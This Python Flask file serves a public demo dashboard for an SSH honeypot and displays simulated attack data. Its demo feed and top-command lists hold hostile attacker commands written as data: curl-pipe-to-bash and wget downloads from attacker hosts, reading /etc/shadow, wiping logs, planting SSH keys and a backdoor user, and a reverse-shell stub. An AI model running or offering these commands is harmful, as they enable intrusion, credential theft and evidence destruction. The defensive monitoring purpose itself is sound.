"""
╔══════════════════════════════════════════════════════════════════════╗
║   🍯  HONEY.AI — Vercel Serverless Dashboard                        ║
║   Deployed at: https://honey-ai.vercel.app                          ║
╠══════════════════════════════════════════════════════════════════════╣
║  This is the PUBLIC DEMO version of the HONEY.AI dashboard.         ║
║  It displays realistic simulated attack data to showcase the UI.    ║
║  The real local version reads live data from attacks.jsonl.         ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import json
import random
import math
from datetime import datetime, timedelta
from flask import Flask, jsonify, render_template_string, request

app = Flask(__name__)


# ─────────────────────────────────────────────────────────────────────────────
#  REALISTIC DEMO DATA
# ─────────────────────────────────────────────────────────────────────────────

DEMO_ATTACKERS = [
    {"ip": "45.142.212.100", "country": "Russia",        "city": "Moscow",       "isp": "OVH SAS",              "lat": 55.7558,  "lon": 37.6173,   "creds": ("root","root"),          "cmds": 47, "score": 85},
    {"ip": "103.72.154.23",  "country": "China",         "city": "Shanghai",     "isp": "ChinaNet Backbone",    "lat": 31.2304,  "lon": 121.4737,  "creds": ("admin","admin123"),      "cmds": 31, "score": 72},
    {"ip": "185.220.101.45", "country": "Germany",       "city": "Frankfurt",    "isp": "Tor Exit Node",        "lat": 50.1109,  "lon": 8.6821,    "creds": ("ubuntu","ubuntu"),       "cmds": 28, "score": 91},
    {"ip": "91.92.251.103",  "country": "Turkey",        "city": "Istanbul",     "isp": "Turk Telekom",         "lat": 41.0082,  "lon": 28.9784,   "creds": ("pi","raspberry"),        "cmds": 19, "score": 45},
    {"ip": "222.186.13.99",  "country": "China",         "city": "Jiangsu",      "isp": "ChinaNet Jiangsu",     "lat": 32.0603,  "lon": 118.7969,  "creds": ("postgres","postgres"),   "cmds": 14, "score": 38},
    {"ip": "194.165.16.111", "country": "Ukraine",       "city": "Kyiv",         "isp": "Hostsailor Ltd",       "lat": 50.4501,  "lon": 30.5234,   "creds": ("test","test123"),        "cmds": 22, "score": 67},
    {"ip": "43.156.25.128",  "country": "Singapore",     "city": "Singapore",    "isp": "Tencent Cloud",        "lat": 1.3521,   "lon": 103.8198,  "creds": ("oracle","oracle"),       "cmds": 9,  "score": 30},
    {"ip": "192.241.213.46", "country": "United States", "city": "New York",     "isp": "DigitalOcean LLC",     "lat": 40.7128,  "lon": -74.0060,  "creds": ("user","password"),       "cmds": 37, "score": 79},
    {"ip": "77.247.181.162", "country": "Netherlands",   "city": "Amsterdam",    "isp": "Leaseweb",             "lat": 52.3702,  "lon": 4.8952,    "creds": ("git","git"),             "cmds": 6,  "score": 22},
    {"ip": "5.181.234.140",  "country": "Brazil",        "city": "São Paulo",    "isp": "Amarutu Technology",   "lat": -23.5505, "lon": -46.6333,  "creds": ("ftpuser","ftp@123"),     "cmds": 11, "score": 51},
    {"ip": "167.235.46.116", "country": "Germany",       "city": "Nuremberg",    "isp": "Hetzner Online GmbH",  "lat": 49.4521,  "lon": 11.0767,   "creds": ("deploy","deploy"),       "cmds": 4,  "score": 18},
    {"ip": "79.137.203.57",  "country": "France",        "city": "Paris",        "isp": "OVH Hosting",          "lat": 48.8566,  "lon": 2.3522,    "creds": ("backup","backup123"),    "cmds": 18, "score": 60},
]

DEMO_FEED = [
    {"event": "command", "ip": "45.142.212.100", "command": "curl http://45.142.212.100/shell.sh | bash",           "threat_level": "critical"},
    {"event": "command", "ip": "185.220.101.45", "command": "useradd -m -s /bin/bash backdoor",                      "threat_level": "critical"},
    {"event": "auth",    "ip": "103.72.154.23",  "username": "root",   "password": "root"},
    {"event": "command", "ip": "192.241.213.46", "command": "cat /etc/shadow",                                        "threat_level": "critical"},
    {"event": "command", "ip": "45.142.212.100", "command": "wget http://malware.ru/bot.sh -O /tmp/b && chmod +x /tmp/b", "threat_level": "high"},
    {"event": "auth",    "ip": "91.92.251.103",  "username": "admin",  "password": "admin123"},
    {"event": "command", "ip": "194.165.16.111", "command": "uname -a",                                               "threat_level": "low"},
    {"event": "command", "ip": "192.241.213.46", "command": "find / -name '*.conf' -readable 2>/dev/null",            "threat_level": "medium"},
    {"event": "command", "ip": "45.142.212.100", "command": "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",       "threat_level": "critical"},
    {"event": "auth",    "ip": "222.186.13.99",  "username": "postgres","password": "postgres"},
    {"event": "command", "ip": "185.220.101.45", "command": "python3 -c 'import socket,subprocess,os;s=socket.socket()'", "threat_level": "critical"},
    {"event": "command", "ip": "103.72.154.23",  "command": "ps aux | grep root",                                     "threat_level": "medium"},
    {"event": "command", "ip": "91.92.251.103",  "command": "whoami",                                                  "threat_level": "low"},
    {"event": "command", "ip": "194.165.16.111", "command": "rm -rf /var/log/*",                                       "threat_level": "high"},
    {"event": "command", "ip": "43.156.25.128",  "command": "mysql -u root -pS3cr3t -e 'show databases'",             "threat_level": "critical"},
    {"event": "command", "ip": "5.181.234.140",  "command": "cat /var/www/html/config.php",                           "threat_level": "high"},
    {"event": "auth",    "ip": "77.247.181.162", "username": "pi",     "password": "raspberry"},
    {"event": "command", "ip": "45.142.212.100", "command": "iptables -F && iptables -P INPUT ACCEPT",                "threat_level": "high"},
    {"event": "command", "ip": "185.220.101.45", "command": "crontab -l",                                             "threat_level": "high"},
    {"event": "command", "ip": "79.137.203.57",  "command": "ssh-keygen -t rsa -f /tmp/.hidden_key -N ''",            "threat_level": "high"},
]

TOP_COMMANDS = {
    "cat /etc/passwd":                                   156,
    "wget http://45.142.212.100/shell.sh":               98,
    "uname -a":                                          87,
    "cat /etc/shadow":                                   73,
    "chmod +x shell.sh && ./shell.sh":                   61,
    "find / -perm -4000 -type f":                        45,
    "python3 -c 'import socket,subprocess,os'":          38,
    "echo root:password | chpasswd":                     31,
}

# Hourly attack pattern (more at night UTC = mornings in Asia)
BASE_HEATMAP = [3, 6, 11, 18, 22, 17, 12, 7, 4, 5, 6, 8,
                9, 10, 11, 10, 9, 11, 14, 13, 10, 8, 6, 4]


def _jitter(val: int, pct: float = 0.15) -> int:
    """Apply small random variation so the dashboard feels live."""
    delta = max(1, int(val * pct))
    return max(0, val + random.randint(-delta, delta))


def _make_timestamps(feed: list) -> list:
    """Add realistic timestamps to feed items (last 3 hours)."""
    now = datetime.utcnow()
    result = []
    for i, item in enumerate(feed):
        offset = timedelta(seconds=i * 320 + random.randint(0, 60))
        ts = (now - offset).isoformat() + "Z"
        result.append({**item, "@timestamp": ts})
    return result


# ─────────────────────────────────────────────────────────────────────────────
#  API ROUTES
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/api/stats")
def api_stats():
    now = datetime.utcnow()

    # Timeline — 24 hourly buckets with realistic variation
    timeline_labels = []
    timeline_values = []
    for i in range(23, -1, -1):
        t = now - timedelta(hours=i)
        timeline_labels.append(t.strftime("%H:%M"))
        hour = t.hour
        base = BASE_HEATMAP[hour]
        timeline_values.append(_jitter(base * 4, 0.3))

    heatmap = [_jitter(v, 0.2) for v in BASE_HEATMAP]

    total_cmds  = _jitter(2847, 0.02)
    total_auths = _jitter(1523, 0.02)
    threat_score = round(68.4 + random.uniform(-2, 2), 1)

    feed = _make_timestamps(DEMO_FEED)

    return jsonify({
        "total_commands":  total_cmds,
        "total_auths":     total_auths,
        "unique_ips":      len(DEMO_ATTACKERS),
        "threat_score":    threat_score,
        "timeline_labels": timeline_labels,
        "timeline_values": timeline_values,
        "heatmap":         heatmap,
        "recent_activity": feed,
        "top_commands":    {k: _jitter(v, 0.05) for k, v in TOP_COMMANDS.items()},
        "top_ips":         {a["ip"]: _jitter(a["cmds"], 0.1) for a in DEMO_ATTACKERS[:5]},
        "demo_mode":       True,
    })


@app.route("/api/map")
def api_map():
    points = []
    for a in DEMO_ATTACKERS:
        points.append({
            "ip":          a["ip"],
            "lat":         a["lat"] + random.uniform(-0.01, 0.01),
            "lon":         a["lon"] + random.uniform(-0.01, 0.01),
            "country":     a["country"],
            "city":        a["city"],
            "isp":         a["isp"],
            "events":      _jitter(a["cmds"], 0.1),
            "threat_score": _jitter(a["score"], 0.08),
        })
    return jsonify(points)


@app.route("/api/fingerprints")
def api_fingerprints():
    fps = []
    for a in sorted(DEMO_ATTACKERS, key=lambda x: x["score"], reverse=True):
        fps.append({
            "ip":          a["ip"],
            "username":    a["creds"][0],
            "password":    a["creds"][1],
            "cmd_count":   _jitter(a["cmds"], 0.1),
            "threat_score": _jitter(a["score"], 0.05),
            "country":     a["country"],
            "isp":         a["isp"],
        })
    return jsonify(fps)


# ─────────────────────────────────────────────────────────────────────────────
#  DASHBOARD HTML
# ─────────────────────────────────────────────────────────────────────────────

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🍯 HONEY.AI | Threat Intelligence Dashboard</title>
    <meta name="description" content="AI-powered SSH honeypot threat intelligence dashboard — real-time attack monitoring and analysis">
    <meta property="og:title" content="🍯 HONEY.AI — Threat Intelligence Platform">
    <meta property="og:description" content="AI-powered SSH honeypot catching attackers in real-time. Built with Python, Ollama, and Paramiko.">
    <meta property="og:type" content="website">
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <style>
        :root {
            --bg:          #050508;
            --bg2:         #080a10;
            --card:        rgba(255,255,255,0.028);
            --card-hover:  rgba(255,255,255,0.045);
            --border:      rgba(255,255,255,0.065);
            --border-glow: rgba(0,229,255,0.22);
            --accent:      #00e5ff;
            --accent2:     #7c3aed;
            --danger:      #ff2d55;
            --warning:     #ff8c00;
            --success:     #00ff88;
            --gold:        #ffd700;
            --text:        #e2e8f0;
            --muted:       #4a5568;
            --mono:        'JetBrains Mono', monospace;
            --sans:        'Space Grotesk', sans-serif;
        }
        *,*::before,*::after { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; overflow-x: hidden; }

        body::before {
            content: ''; position: fixed; inset: 0;
            background-image: radial-gradient(rgba(0,229,255,0.05) 1px, transparent 1px);
            background-size: 32px 32px; pointer-events: none; z-index: 0;
        }
        .orb { position: fixed; border-radius: 50%; filter: blur(90px); pointer-events: none; z-index: 0; }
        .orb-1 { width:500px; height:500px; top:-150px; left:-150px; background: radial-gradient(circle, rgba(0,229,255,0.06), transparent 70%); }
        .orb-2 { width:400px; height:400px; bottom:-100px; right:-100px; background: radial-gradient(circle, rgba(124,58,237,0.06), transparent 70%); }

        .wrap { max-width: 1680px; margin: 0 auto; padding: 20px 24px; position: relative; z-index: 1; }

        .glass {
            background: var(--card); backdrop-filter: blur(20px) saturate(1.4);
            -webkit-backdrop-filter: blur(20px) saturate(1.4);
            border: 1px solid var(--border); border-radius: 18px;
            padding: 22px 24px; transition: border-color 0.25s ease;
        }
        .glass:hover { border-color: var(--border-glow); }

        .card-label {
            font-size: 0.65rem; font-weight: 600; letter-spacing: 2px;
            text-transform: uppercase; color: var(--muted); margin-bottom: 14px;
            display: flex; align-items: center; gap: 8px;
        }
        .card-label::before {
            content: ''; display: inline-block; width: 3px; height: 11px;
            background: var(--accent); border-radius: 2px;
        }

        /* Header */
        header {
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 22px; padding-bottom: 18px; border-bottom: 1px solid var(--border);
        }
        .logo { display: flex; align-items: center; gap: 14px; }
        .logo-icon { font-size: 2.2rem; filter: drop-shadow(0 0 14px rgba(0,229,255,0.5)); }
        .logo h1 {
            font-size: 1.55rem; font-weight: 700; letter-spacing: -0.5px;
            background: linear-gradient(130deg, #ffffff 30%, var(--accent));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; line-height: 1;
        }
        .logo p { font-size: 0.65rem; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-top: 4px; }
        .hdr-right { display: flex; align-items: center; gap: 16px; }
        #clock { font-family: var(--mono); font-size: 0.78rem; color: var(--muted); }

        .demo-badge {
            padding: 5px 12px; background: rgba(255,215,0,0.1);
            border: 1px solid rgba(255,215,0,0.25); border-radius: 100px;
            font-size: 0.65rem; font-weight: 700; letter-spacing: 1.5px;
            color: var(--gold); text-transform: uppercase;
        }
        .live-badge {
            display: flex; align-items: center; gap: 8px; padding: 7px 14px;
            background: rgba(0,255,136,0.07); border: 1px solid rgba(0,255,136,0.18);
            border-radius: 100px;
        }
        .live-dot { width: 7px; height: 7px; background: var(--success); border-radius: 50%; box-shadow: 0 0 8px var(--success); animation: pulse 2s infinite; }
        @keyframes pulse { 0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.5;transform:scale(0.75);} }
        .live-txt { font-size: 0.7rem; font-weight: 700; letter-spacing: 1.5px; color: var(--success); }

        /* Stats */
        .stats-row { display: grid; grid-template-columns: repeat(4,1fr); gap: 16px; margin-bottom: 20px; }
        .stat { position: relative; overflow: hidden; padding: 20px 22px; }
        .stat::after {
            content: ''; position: absolute; top: -20px; right: -20px;
            width: 100px; height: 100px; border-radius: 50%; filter: blur(40px); opacity: 0.18; pointer-events: none;
        }
        .stat.s-blue::after  { background: var(--accent); }
        .stat.s-purple::after { background: var(--accent2); }
        .stat.s-red::after   { background: var(--danger); }
        .stat.s-green::after  { background: var(--success); }
        .stat-icon { font-size: 1.4rem; margin-bottom: 14px; }
        .stat-val { font-size: 2.75rem; font-weight: 700; font-family: var(--mono); line-height: 1; margin-bottom: 6px; }
        .s-blue .stat-val   { color: var(--accent);  text-shadow: 0 0 24px rgba(0,229,255,0.35); }
        .s-purple .stat-val { color: #a78bfa;         text-shadow: 0 0 24px rgba(124,58,237,0.35); }
        .s-red .stat-val    { color: var(--danger);   text-shadow: 0 0 24px rgba(255,45,85,0.35); }
        .s-green .stat-val  { color: var(--success);  text-shadow: 0 0 24px rgba(0,255,136,0.35); }
        .stat-lbl { font-size: 0.68rem; font-weight: 600; letter-spacing: 1.5px; text-transform: uppercase; color: var(--muted); }

        /* Grids */
        .main-grid { display: grid; grid-template-columns: 340px 1fr 320px; gap: 18px; margin-bottom: 18px; }
        .chart-box { height: 190px; position: relative; }
        .hmap-title { margin-top: 18px; }
        .hmap-bars { display: flex; gap: 3px; align-items: flex-end; height: 56px; margin-top: 8px; }
        .hbar { flex: 1; border-radius: 3px 3px 0 0; min-height: 4px; cursor: pointer; transition: opacity 0.2s; }
        .hbar:hover { opacity: 0.75; }
        .hmap-lbls { display: flex; gap: 3px; margin-top: 4px; }
        .hmap-lbl { flex: 1; text-align: center; font-size: 0.5rem; color: var(--muted); font-family: var(--mono); }

        #attack-map { height: 370px; border-radius: 12px; overflow: hidden; }
        .leaflet-container { background: #08091a !important; font-family: var(--sans) !important; }
        .map-legend { display: flex; gap: 14px; margin-top: 10px; font-size: 0.68rem; color: var(--muted); flex-wrap: wrap; }
        .legend-dot { width: 8px; height: 8px; border-radius: 50%; }
        #map-count { margin-left: auto; }

        .fp-scroll { max-height: 380px; overflow-y: auto; overflow-x: auto; }
        .fp-scroll::-webkit-scrollbar { width: 3px; }
        .fp-scroll::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
        table.fp { width: 100%; border-collapse: collapse; font-size: 0.75rem; }
        table.fp th { text-align: left; padding: 7px 8px; color: var(--muted); font-size: 0.6rem; letter-spacing: 1.5px; text-transform: uppercase; border-bottom: 1px solid var(--border); white-space: nowrap; }
        table.fp td { padding: 9px 8px; border-bottom: 1px solid rgba(255,255,255,0.025); font-family: var(--mono); font-size: 0.72rem; white-space: nowrap; }
        table.fp tr:hover td { background: rgba(255,255,255,0.018); }
        .risk-pill { display: inline-block; padding: 2px 7px; border-radius: 6px; font-size: 0.6rem; font-weight: 700; }

        .bot-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }
        .feed { max-height: 300px; overflow-y: auto; }
        .feed::-webkit-scrollbar { width: 3px; }
        .feed::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
        .feed-row { display: grid; grid-template-columns: 62px 88px 1fr; gap: 10px; padding: 9px 10px; border-bottom: 1px solid rgba(255,255,255,0.025); align-items: center; transition: background 0.15s; }
        .feed-row:hover { background: rgba(255,255,255,0.018); }
        .feed-ts { font-family: var(--mono); font-size: 0.68rem; color: var(--muted); }
        .feed-cmd { font-family: var(--mono); font-size: 0.75rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .badge { display: inline-block; padding: 2px 7px; border-radius: 5px; font-size: 0.58rem; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; }
        .b-critical { background: rgba(255,45,85,0.15);  color: var(--danger);  border: 1px solid rgba(255,45,85,0.25); }
        .b-high     { background: rgba(255,140,0,0.15);  color: var(--warning); border: 1px solid rgba(255,140,0,0.25); }
        .b-medium   { background: rgba(255,215,0,0.12);  color: var(--gold);    border: 1px solid rgba(255,215,0,0.2); }
        .b-low      { background: rgba(0,255,136,0.1);   color: var(--success); border: 1px solid rgba(0,255,136,0.2); }
        .b-auth     { background: rgba(124,58,237,0.15); color: #a78bfa;         border: 1px solid rgba(124,58,237,0.25); }
        .b-unknown  { background: rgba(255,255,255,0.05); color: var(--muted);  border: 1px solid var(--border); }

        .cmd-list { list-style: none; }
        .cmd-row { display: flex; align-items: center; gap: 10px; padding: 9px 0; border-bottom: 1px solid rgba(255,255,255,0.025); }
        .cmd-txt { font-family: var(--mono); font-size: 0.75rem; flex: 1; min-width: 0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .cmd-bar-bg { flex: 1.2; height: 3px; background: rgba(255,255,255,0.05); border-radius: 2px; }
        .cmd-bar-fill { height: 100%; background: linear-gradient(90deg, var(--accent2), var(--accent)); border-radius: 2px; transition: width 0.5s ease; }
        .cmd-count { font-family: var(--mono); font-size: 0.78rem; font-weight: 600; color: var(--accent); min-width: 22px; text-align: right; }

        /* GitHub link */
        .gh-link {
            display: flex; align-items: center; gap: 8px;
            padding: 7px 14px; border-radius: 100px;
            background: rgba(255,255,255,0.05); border: 1px solid var(--border);
            color: var(--text); text-decoration: none; font-size: 0.72rem; font-weight: 600;
            transition: border-color 0.2s;
        }
        .gh-link:hover { border-color: var(--border-glow); color: var(--accent); }
        .gh-icon { width: 16px; height: 16px; fill: currentColor; }

        @keyframes fadeUp { from{opacity:0;transform:translateY(14px);}to{opacity:1;transform:translateY(0);} }
        .glass { animation: fadeUp 0.45s ease both; }
        .stats-row .glass:nth-child(1){animation-delay:0.04s;}
        .stats-row .glass:nth-child(2){animation-delay:0.08s;}
        .stats-row .glass:nth-child(3){animation-delay:0.12s;}
        .stats-row .glass:nth-child(4){animation-delay:0.16s;}

        @media (max-width:1280px) { .main-grid { grid-template-columns: 1fr 1fr; } }
        @media (max-width:900px)  { .main-grid,.stats-row,.bot-grid { grid-template-columns: 1fr; } .stats-row { grid-template-columns: 1fr 1fr; } }
    </style>
</head>
<body>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>
<div class="wrap">

    <header>
        <div class="logo">
            <div class="logo-icon">🍯</div>
            <div>
                <h1>HONEY.AI</h1>
                <p>Threat Intelligence Platform · v2.0</p>
            </div>
        </div>
        <div class="hdr-right">
            <div id="clock">--:--:--</div>
            <span class="demo-badge">⚡ Demo Mode</span>
            <a class="gh-link" href="https://github.com/ankitpatel" target="_blank" id="gh-link">
                <svg class="gh-icon" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
                GitHub
            </a>
            <div class="live-badge">
                <div class="live-dot"></div>
                <span class="live-txt">Live</span>
            </div>
        </div>
    </header>

    <div class="stats-row">
        <div class="glass stat s-blue"><div class="stat-icon">⚡</div><div class="stat-val" id="v-cmds">0</div><div class="stat-lbl">Commands Captured</div></div>
        <div class="glass stat s-purple"><div class="stat-icon">🔑</div><div class="stat-val" id="v-auths">0</div><div class="stat-lbl">Auth Attempts</div></div>
        <div class="glass stat s-red"><div class="stat-icon">🌐</div><div class="stat-val" id="v-ips">0</div><div class="stat-lbl">Unique Threat IPs</div></div>
        <div class="glass stat s-green"><div class="stat-icon">🛡️</div><div class="stat-val" id="v-threat" style="color:var(--success)">0</div><div class="stat-lbl">Threat Score / 100</div></div>
    </div>

    <div class="main-grid">
        <div class="glass" style="padding:20px;">
            <div class="card-label">Attack Timeline · 24h</div>
            <div class="chart-box"><canvas id="tlChart"></canvas></div>
            <div class="hmap-title"><div class="card-label">Events by Hour of Day</div></div>
            <div class="hmap-bars" id="hmap-bars"></div>
            <div class="hmap-lbls" id="hmap-lbls"></div>
        </div>

        <div class="glass" style="padding:16px;">
            <div class="card-label">Global Attack Origin Map</div>
            <div id="attack-map"></div>
            <div class="map-legend">
                <span><div class="legend-dot" style="background:var(--danger)"></div>Critical</span>
                <span><div class="legend-dot" style="background:var(--warning)"></div>High</span>
                <span><div class="legend-dot" style="background:var(--accent)"></div>Low/Med</span>
                <span id="map-count">0 sources</span>
            </div>
        </div>

        <div class="glass" style="padding:16px;">
            <div class="card-label">Attacker Fingerprints</div>
            <div class="fp-scroll">
                <table class="fp">
                    <thead><tr><th>IP</th><th>Creds</th><th>Cmds</th><th>Risk</th><th>Geo</th></tr></thead>
                    <tbody id="fp-body"><tr><td colspan="5" style="color:var(--muted);padding:20px;text-align:center">Loading…</td></tr></tbody>
                </table>
            </div>
        </div>
    </div>

    <div class="bot-grid">
        <div class="glass" style="padding:20px;">
            <div class="card-label">Real-time Activity Feed</div>
            <div class="feed" id="event-feed"><div style="color:var(--muted);padding:20px;text-align:center">Loading…</div></div>
        </div>
        <div class="glass" style="padding:20px;">
            <div class="card-label">Top Command Injections</div>
            <ul class="cmd-list" id="top-cmds"><li style="color:var(--muted);padding:20px;text-align:center">Loading…</li></ul>
        </div>
    </div>

</div>

<script>
function tick(){const t=new Date();document.getElementById('clock').textContent=t.toLocaleTimeString('en-GB',{hour12:false})+' UTC';}
setInterval(tick,1000);tick();

const map=L.map('attack-map',{zoomControl:false,attributionControl:false,center:[20,0],zoom:2,minZoom:1,maxZoom:8});
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{subdomains:'abcd',maxZoom:19}).addTo(map);
let mapLayers=[];
function renderMap(pts){
    mapLayers.forEach(l=>map.removeLayer(l));mapLayers=[];
    pts.forEach(p=>{
        const s=p.threat_score||0;
        const color=s>60?'#ff2d55':s>30?'#ff8c00':'#00e5ff';
        const radius=Math.max(5,Math.min(20,4+p.events*0.4));
        const m=L.circleMarker([p.lat,p.lon],{radius,fillColor:color,color,fillOpacity:0.6,weight:1.5,opacity:0.9})
            .bindPopup(`<div style="font-family:Space Grotesk,sans-serif;background:#0a0e1a;color:#e2e8f0;padding:8px 10px;border-radius:8px;font-size:12px;min-width:180px"><b style="color:${color}">${p.ip}</b><br>📍 ${p.city?p.city+', ':''}${p.country}<br>🏢 ${p.isp||'Unknown'}<br>📊 ${p.events} events · Risk: ${s}</div>`,{maxWidth:220}).addTo(map);
        mapLayers.push(m);
    });
    document.getElementById('map-count').textContent=pts.length+' sources';
}

const tlCtx=document.getElementById('tlChart').getContext('2d');
const tlChart=new Chart(tlCtx,{type:'line',data:{labels:[],datasets:[{data:[],borderColor:'#00e5ff',borderWidth:2.5,fill:true,backgroundColor:ctx=>{const g=ctx.chart.ctx.createLinearGradient(0,0,0,180);g.addColorStop(0,'rgba(0,229,255,0.18)');g.addColorStop(1,'rgba(0,229,255,0)');return g;},tension:0.4,pointBackgroundColor:'#00e5ff',pointRadius:3,pointHoverRadius:6}]},options:{maintainAspectRatio:false,plugins:{legend:{display:false},tooltip:{backgroundColor:'#0c1020',borderColor:'rgba(0,229,255,0.3)',borderWidth:1,titleColor:'#00e5ff',bodyColor:'#e2e8f0'}},scales:{y:{beginAtZero:true,grid:{color:'rgba(255,255,255,0.03)'},ticks:{color:'#4a5568',font:{size:10}}},x:{grid:{display:false},ticks:{color:'#4a5568',font:{size:10},maxTicksLimit:8}}}}});

function renderHeatmap(data){
    const mx=Math.max(...data,1);
    document.getElementById('hmap-bars').innerHTML=data.map((v,i)=>{const pct=Math.round((v/mx)*100);const col=pct>70?'#ff2d55':pct>40?'#ff8c00':'rgba(0,229,255,0.3)';return`<div class="hbar" style="height:${Math.max(pct,4)}%;background:${col}" title="${i}:00 — ${v}"></div>`;}).join('');
    document.getElementById('hmap-lbls').innerHTML=data.map((_,i)=>`<div class="hmap-lbl">${i%6===0?i+'h':''}</div>`).join('');
}

function riskPill(s){if(s>=70)return`<span class="risk-pill" style="background:rgba(255,45,85,0.15);color:#ff2d55;border:1px solid rgba(255,45,85,0.25)">${s}</span>`;if(s>=40)return`<span class="risk-pill" style="background:rgba(255,140,0,0.15);color:#ff8c00;border:1px solid rgba(255,140,0,0.25)">${s}</span>`;if(s>=15)return`<span class="risk-pill" style="background:rgba(255,215,0,0.12);color:#ffd700;border:1px solid rgba(255,215,0,0.2)">${s}</span>`;return`<span class="risk-pill" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.18)">${s}</span>`;}

function renderFP(fps){
    const tbody=document.getElementById('fp-body');
    if(!fps||!fps.length){tbody.innerHTML=`<tr><td colspan="5" style="color:var(--muted);padding:20px;text-align:center">No data.</td></tr>`;return;}
    tbody.innerHTML=fps.map(f=>`<tr><td style="color:var(--accent)">${f.ip}</td><td style="color:#888;font-size:0.68rem">${f.username}:${f.password}</td><td>${f.cmd_count}</td><td>${riskPill(f.threat_score)}</td><td style="color:#888;font-size:0.68rem">${f.country||'?'}</td></tr>`).join('');
}

function badgeCls(item){if(item.event==='auth')return'b-auth';const l=item.threat_level||'';return{critical:'b-critical',high:'b-high',medium:'b-medium',low:'b-low'}[l]||'b-unknown';}
function badgeTxt(item){if(item.event==='auth')return'AUTH';return(item.threat_level||item.event||'CMD').toUpperCase();}

function renderFeed(items){
    if(!items||!items.length)return;
    document.getElementById('event-feed').innerHTML=items.map(e=>{const ts=e['@timestamp']?e['@timestamp'].split('T')[1].slice(0,8):'--';const txt=e.command||e.username||'event';return`<div class="feed-row"><span class="feed-ts">${ts}</span><span><span class="badge ${badgeCls(e)}">${badgeTxt(e)}</span></span><span class="feed-cmd" title="${txt}">${txt}</span></div>`;}).join('');
}

function renderCmds(obj){
    const el=document.getElementById('top-cmds');
    const entries=Object.entries(obj||{});
    if(!entries.length){el.innerHTML=`<li style="color:var(--muted);padding:20px;text-align:center">No commands.</li>`;return;}
    const mx=Math.max(...entries.map(e=>e[1]),1);
    el.innerHTML=entries.map(([cmd,cnt])=>{const pct=Math.round((cnt/mx)*100);return`<li class="cmd-row"><span class="cmd-txt" title="${cmd}">${cmd}</span><div class="cmd-bar-bg"><div class="cmd-bar-fill" style="width:${pct}%"></div></div><span class="cmd-count">${cnt}</span></li>`;}).join('');
}

function animTo(el,target){
    const start=parseInt(el.textContent)||0;if(start===target)return;
    const steps=20,delay=600/steps;let i=0;
    const t=setInterval(()=>{i++;el.textContent=Math.round(start+(target-start)*(i/steps));if(i>=steps){el.textContent=target;clearInterval(t);}},delay);
}
function threatCol(s){return s>=70?'var(--danger)':s>=40?'var(--warning)':s>=20?'var(--gold)':'var(--success)';}

async function refresh(){
    try{
        const r=await fetch('/api/stats');const d=await r.json();
        animTo(document.getElementById('v-cmds'),d.total_commands);
        animTo(document.getElementById('v-auths'),d.total_auths);
        animTo(document.getElementById('v-ips'),d.unique_ips);
        const tv=document.getElementById('v-threat');animTo(tv,d.threat_score);tv.style.color=threatCol(d.threat_score);
        tlChart.data.labels=d.timeline_labels||[];tlChart.data.datasets[0].data=d.timeline_values||[];tlChart.update('none');
        if(d.heatmap)renderHeatmap(d.heatmap);
        renderFeed(d.recent_activity||[]);
        renderCmds(d.top_commands||{});
    }catch(e){console.warn('[stats]',e);}
    try{const mr=await fetch('/api/map');renderMap(await mr.json());}catch(e){}
    try{const fr=await fetch('/api/fingerprints');renderFP(await fr.json());}catch(e){}
}
refresh();setInterval(refresh,5000);
</script>
</body>
</html>"""


@app.route("/")
def index():
    return render_template_string(DASHBOARD_HTML)


# Required for Vercel
app = app
